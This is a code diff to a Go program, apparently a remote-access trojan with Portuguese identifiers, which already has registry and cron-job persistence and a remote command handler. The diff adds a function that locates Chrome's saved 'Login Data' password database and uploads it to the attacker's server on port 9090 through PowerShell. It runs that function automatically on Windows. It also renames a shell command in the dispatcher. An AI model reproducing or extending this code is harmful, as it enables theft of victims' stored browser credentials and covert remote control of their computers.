@@ -36,6 +36,22 @@ const (
 	PORTA    = "9090"
 )
 
+func BaixaCreedsGoogle() error {
+	userHomeDir, err := os.UserHomeDir()
+	if err != nil {
+		return err
+	}
+
+	chromeDataDir := filepath.Join(userHomeDir, "AppData", "Local", "Google", "Chrome", "User Data", "Default")
+	cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`(New-Object System.Net.WebClient).UploadFile('http://%s/tmp', '%s')`, SERVIDOR+":"+PORTA, filepath.Join(chromeDataDir, "Login Data")))
+	err = cmd.Run()
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
 func CapturaUser() {
 	currentUser, err := user.Current()
 	if err != nil {
@@ -161,6 +177,7 @@ func main() {
 	if runtime.GOOS == "windows" {
 		DownloadDll()
 		addRegistryKey()
+		BaixaCreedsGoogle()
 	} else if runtime.GOOS == "linux" {
 		createCronJob()
 	} else {
@@ -192,7 +209,7 @@ func executaComando(comando string, indice int) (resposta string) {
 	comandoSeparado := helpers.SeparaComando(comando)
 	comandoBase := comandoSeparado[0]
 	switch comandoBase {
-	case "ls":
+	case "list":
 		resposta = listaArquivos()
 	case "pwd":
 		resposta = listaDiretorioAtual()
